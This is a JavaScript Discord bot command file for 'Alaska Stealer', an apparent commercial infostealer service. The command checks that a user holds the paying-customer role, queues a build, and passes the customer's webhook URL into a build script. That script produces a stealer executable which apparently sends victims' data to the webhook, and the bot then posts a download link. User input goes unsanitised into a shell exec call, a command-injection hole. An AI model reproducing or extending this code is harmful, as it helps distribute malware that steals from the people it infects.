//import
const Discord = require("discord.js");
const { Intents } = require('discord.js')
const client = new Discord.Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_MESSAGE_REACTIONS, Intents.FLAGS.GUILD_PRESENCES] });
const ICO = require('icojs');
const https = require('https');
const fs = require('fs');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const { MessageEmbed } = require('discord.js');


//empty queue

var queue = [];

//infos
const clientId = "1135536674340880414";
const guildId = "1133461496165306438";
const verifiedRole = "1139277028516958271";

function generateId(len) {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < len; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const buildstarted = new MessageEmbed()
    .setColor(0xFF001A)
    .setTitle('Alaska Stealer')
    .setURL("https://t.me/St34ler")
    .setDescription(`Started your build... ETA: 1M  `)
    .setTimestamp()
    .setFooter({ text: '@alaskastealer', iconURL: "" });

const invalidicodetected = new MessageEmbed()
    .setColor(0xFF001A)
    .setTitle('Alaska Stealer')
    .setURL("https://t.me/St34ler")
    .addFields({ name: `Error: Invalid .ico detected, build process aborted.`, value: '*Please retry with .ico file*', inline: true })
    .setTimestamp()
    .setFooter({ text: '@alaskastealer', iconURL: "" });

const invalidicodetected2 = new MessageEmbed()
    .setColor(0xFF001A)
    .setTitle('Alaska Stealer')
    .setURL("https://t.me/St34ler")
    .addFields({ name: `Error: Invalid .ico detected, build process aborted.  `, value: '*Please retry with 64x64 ico file, if not work, contact an admin.*', inline: true })
    .setTimestamp()
    .setFooter({ text: '@alaskastealer', iconURL: "" });

const noverifiedrole = new MessageEmbed()
    .setColor(0xFF001A)
    .setTitle('Alaska Stealer')
    .setURL("https://t.me/St34ler")
    .addFields({ name: `Error: You don\'t have customer role, build process aborted.  `, value: '*if it\'s a bug do /refresh in Alaska Stealer server.*', inline: true })
    .setTimestamp()
    .setFooter({ text: '@alaskastealer', iconURL: "" });

let expression = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/gi;
let urlMatch = new RegExp(expression);

async function queueLoop() {
    while(true) {
        await sleep(5000);
        if (queue.length == 0) {
            continue
        }
        const element = queue.shift();
        console.log(element);
        try {
        element.interaction.editReply({embeds: [buildstarted]})
        } catch (e) {console.log(e)}
        if (element.icon_error) {
            try {
            await exec(`cd Client && node build.js ${element.webhook_url} ${element.name}`)
            } catch (e) {console.log(e)}
            const gofileurl = fs.readFileSync('/root/Alaska/Blaze/link.txt');
            const downloadlink1 = new MessageEmbed()
                .setColor(0xFF001A)
                .setTitle('Alaska Stealer')
                .setURL("https://t.me/St34ler")
                .setDescription(`Download link: [Download](${gofileurl}) `)
                .setTimestamp()
                .setFooter({ text: '@alaskastealer', iconURL: "" });
            element.interaction.editReply({embeds: [downloadlink1]});
            fs.rmSync(`/root/Alaska/Blaze/Client/link.txt`)
        } else {
            try {
            fs.appendFileSync("link.txt", "");
            await exec(`cd Client && node build.js ${element.webhook_url} ${element.name}`)
            const gofileurl = fs.readFileSync('/root/Alaska/Blaze/link.txt');
            const downloadlink2 = new MessageEmbed()
            .setColor(0xFF001A)
            .setTitle('Alaska Stealer')
            .setURL("https://t.me/St34ler")
            .setDescription(`Download link: [Download](${gofileurl}) `)
            .setTimestamp()
            .setFooter({ text: '@alaskastealer', iconURL: "" });
            element.interaction.editReply({embeds: [downloadlink2]});
            fs.rmSync('/root/Alaska/Blaze/link.txt');
        } catch (e) {console.log(e), element.interaction.editReply({embeds: [invalidicodetected2]})}
        }
    }
}

queueLoop()

module.exports = {
  name: 'build',
  description: 'build an exe.',
  options: [
    {
        name: 'webhook_url',
        description: 'Your webhook',
        type: 'STRING',
        required: true
    },
    {
        name: 'name',
        description: 'Exe name WITHOUT SPACE',
        type: 'STRING',
        required: true
    }],

    run: async (client, interaction) => {

        let guild = client.guilds.cache.get(guildId);
        let role = guild.roles.cache.get(verifiedRole);
        let verified = role.members.map(m => m.id);

        if (!verified.includes(interaction.user.id)) {
            await interaction.reply({embeds: [noverifiedrole]});
            return
        }

        const webhook_url = interaction.options.getString('webhook_url');
        const name = interaction.options.getString('name');
        const build_id = generateId(8);

    const queue1 = new MessageEmbed()
        .setColor(0xFF001A)
        .setTitle('Alaska Stealer')
        .setURL("https://t.me/St34ler")
        .addFields({ name: `Successfully added your build to queue.. `, value:`*Queue size: ${queue.length}, ETA: ${queue.length*2}m*`, inline: true })
        .setTimestamp()
        .setFooter({ text: '@alaskastealer', iconURL: "" });

    const queue2 = new MessageEmbed()
        .setColor(0xFF001A)
        .setTitle('Alaska Stealer')
        .setURL("https://t.me/St34ler")
        .addFields({ name: `Successfully added your build to queue `, value:`*Queue size: ${queue.length+1}, ETA: ${(queue.length+1)*2}m*`, inline: true })
        .setTimestamp()
        .setFooter({ text: '@alaskastealer', iconURL: "" });
    interaction.reply({embeds: [queue2]});
    try {
        const file = fs.createWriteStream(process.cwd() + `/Client/${build_id}.ico`);
        const request = https.get(icon_url, function(response) {
            response.pipe(file);
              file.on("finish", () => {
                file.close();
                queue.push({
                    build_id: build_id,
                    webhook_url: webhook_url,
                    name: name,
                    interaction: interaction
                })
            });
        });
    } catch (e) {
        queue.push({
            id: build_id,
            webhook_url: webhook_url,
            name: name,
            interaction: interaction
        })
    }
}};
